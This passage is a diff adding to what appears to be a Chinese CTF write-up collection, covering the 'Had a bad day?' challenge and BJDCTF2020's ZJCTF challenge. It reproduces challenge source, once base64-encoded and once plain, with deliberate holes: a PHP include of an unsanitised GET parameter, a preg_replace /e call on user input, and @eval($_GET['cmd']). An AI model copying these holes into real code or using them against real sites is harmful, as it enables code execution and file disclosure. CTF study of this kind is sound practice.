29sb3ItdGV4dC0tZ3JleS04MDAiPgogICAgICAgIDxkaXYgY2xhc3M9Im1kbC1sYXlvdXRfX2hlYWRlci1yb3ciPgogICAgICAgICAgPHNwYW4gY2xhc3M9Im1kbC1sYXlvdXQtdGl0bGUiPkhhZCBhIGJhZCBkYXk/PC9zcGFuPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWxheW91dC1zcGFjZXIiPjwvZGl2PgogICAgICAgIDxkaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJwYWdlLXJpYmJvbiI+PC9kaXY+CiAgICAgIDxtYWluIGNsYXNzPSJwYWdlLW1haW4gbWRsLWxheW91dF9fY29udGVudCI+CiAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jb250YWluZXIgbWRsLWdyaWQiPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWNlbGwgbWRsLWNlbGwtLTItY29sIG1kbC1jZWxsLS1oaWRlLXRhYmxldCBtZGwtY2VsbC0taGlkZS1waG9uZSI+PC9kaXY+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWNvbnRlbnQgbWRsLWNvbG9yLS13aGl0ZSBtZGwtc2hhZG93LS00ZHAgY29udGVudCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAgbWRsLWNlbGwgbWRsLWNlbGwtLTgtY29sIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jcnVtYnMgbWRsLWNvbG9yLXRleHQtLWdyZXktNTAwIj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxoMz5DaGVlciB1cCE8L2gzPgogICAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgRGlkIHlvdSBoYXZlIGEgYmFkIGRheT8gRGlkIHRoaW5ncyBub3QgZ28geW91ciB3YXkgdG9kYXk/IEFyZSB5b3UgZmVlbGluZyBkb3duPyBQaWNrIGFuIG9wdGlvbiBhbmQgbGV0IHRoZSBhZG9yYWJsZSBpbWFnZXMgY2hlZXIgeW91IHVwIQogICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWluY2x1ZGUiPgogICAgICAgICAgICAgIDw/cGhwCgkJCQkkZmlsZSA9ICRfR0VUWydjYXRlZ29yeSddOwoKCQkJCWlmKGlzc2V0KCRmaWxlKSkKCQkJCXsKCQkJCQlpZiggc3RycG9zKCAkZmlsZSwgIndvb2ZlcnMiICkgIT09ICBmYWxzZSB8fCBzdHJwb3MoICRmaWxlLCAibWVvd2VycyIgKSAhPT0gIGZhbHNlIHx8IHN0cnBvcyggJGZpbGUsICJpbmRleCIpKXsKCQkJCQkJaW5jbHVkZSAoJGZpbGUgLiAnLnBocCcpOwoJCQkJCX0KCQkJCQllbHNlewoJCQkJCQllY2hvICJTb3JyeSwgd2UgY3VycmVudGx5IG9ubHkgc3VwcG9ydCB3b29mZXJzIGFuZCBtZW93ZXJzLiI7CgkJCQkJfQoJCQkJfQoJCQkJPz4KCQkJPC9kaXY+CiAgICAgICAgICA8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiIGlkPSJjaG9pY2UiPgogICAgICAgICAgICAgIDxjZW50ZXI+PGJ1dHRvbiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2hvaWNlJykuc3VibWl0KCk7IiBuYW1lPSJjYXRlZ29yeSIgdmFsdWU9Indvb2ZlcnMiIGNsYXNzPSJtZGwtYnV0dG9uIG1kbC1idXR0b24tLWNvbG9yZWQgbWRsLWJ1dHRvbi0tcmFpc2VkIG1kbC1qcy1idXR0b24gbWRsLWpzLXJpcHBsZS1lZmZlY3QiIGRhdGEtdXBncmFkZWQ9IixNYXRlcmlhbEJ1dHRvbixNYXRlcmlhbFJpcHBsZSI+V29vZmVyczxzcGFuIGNsYXNzPSJtZGwtYnV0dG9uX19yaXBwbGUtY29udGFpbmVyIj48c3BhbiBjbGFzcz0ibWRsLXJpcHBsZSBpcy1hbmltYXRpbmciIHN0eWxlPSJ3aWR0aDogMTg5LjM1NnB4OyBoZWlnaHQ6IDE4OS4zNTZweDsgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgdHJhbnNsYXRlKDMxcHgsIDI1cHgpOyI+PC9zcGFuPjwvc3Bhbj48L2J1dHRvbj4KICAgICAgICAgICAgICA8YnV0dG9uIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjaG9pY2UnKS5zdWJtaXQoKTsiIG5hbWU9ImNhdGVnb3J5IiB2YWx1ZT0ibWVvd2VycyIgY2xhc3M9Im1kbC1idXR0b24gbWRsLWJ1dHRvbi0tY29sb3JlZCBtZGwtYnV0dG9uLS1yYWlzZWQgbWRsLWpzLWJ1dHRvbiBtZGwtanMtcmlwcGxlLWVmZmVjdCIgZGF0YS11cGdyYWRlZD0iLE1hdGVyaWFsQnV0dG9uLE1hdGVyaWFsUmlwcGxlIj5NZW93ZXJzPHNwYW4gY2xhc3M9Im1kbC1idXR0b25fX3JpcHBsZS1jb250YWluZXIiPjxzcGFuIGNsYXNzPSJtZGwtcmlwcGxlIGlzLWFuaW1hdGluZyIgc3R5bGU9IndpZHRoOiAxODkuMzU2cHg7IGhlaWdodDogMTg5LjM1NnB4OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSB0cmFuc2xhdGUoMzFweCwgMjVweCk7Ij48L3NwYW4+PC9zcGFuPjwvYnV0dG9uPjwvY2VudGVyPgogICAgICAgICAgPC9mb3JtPgoKICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L21haW4+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSJqcy9tYXRlcmlhbC5taW4uanMiPjwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==
+
+```
+
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+```html
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Images that spark joy">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <title>Had a bad day?</title>
+    <link rel="stylesheet" href="css/material.min.css">
+    <link rel="stylesheet" href="css/style.css">
+  </head>
+  <body>
+    <div class="page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100">
+      <header class="page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800">
+        <div class="mdl-layout__header-row">
+          <span class="mdl-layout-title">Had a bad day?</span>
+          <div class="mdl-layout-spacer"></div>
+        <div>
+      </header>
+      <div class="page-ribbon"></div>
+      <main class="page-main mdl-layout__content">
+        <div class="page-container mdl-grid">
+          <div class="mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone"></div>
+          <div class="page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col">
+            <div class="page-crumbs mdl-color-text--grey-500">
+            </div>
+            <h3>Cheer up!</h3>
+              <p>
+                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
+              </p>
+              <div class="page-include">
+              <?php
+				$file = $_GET['category'];
+
+				if(isset($file))
+				{
+					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
+						include ($file . '.php');
+					}
+					else{
+						echo "Sorry, we currently only support woofers and meowers.";
+					}
+				}
+				?>
+			</div>
+          <form action="index.php" method="get" id="choice">
+              <center><button onclick="document.getElementById('choice').submit();" name="category" value="woofers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Woofers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button>
+              <button onclick="document.getElementById('choice').submit();" name="category" value="meowers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Meowers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button></center>
+          </form>
+
+          </div>
+        </div>
+      </main>
+    </div>
+    <script src="js/material.min.js"></script>
+  </body>
+</html>
+```
+
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+
+
+***
+
+## （21）\[BJDCTF2020]ZJCTF，不过如此 1
+
+<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+```php
+<?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',
+        'strtolower("\\1")',
+        $str
+    );
+}
+
+
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+
+function getFlag(){
+	@eval($_GET['cmd']);
+}
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
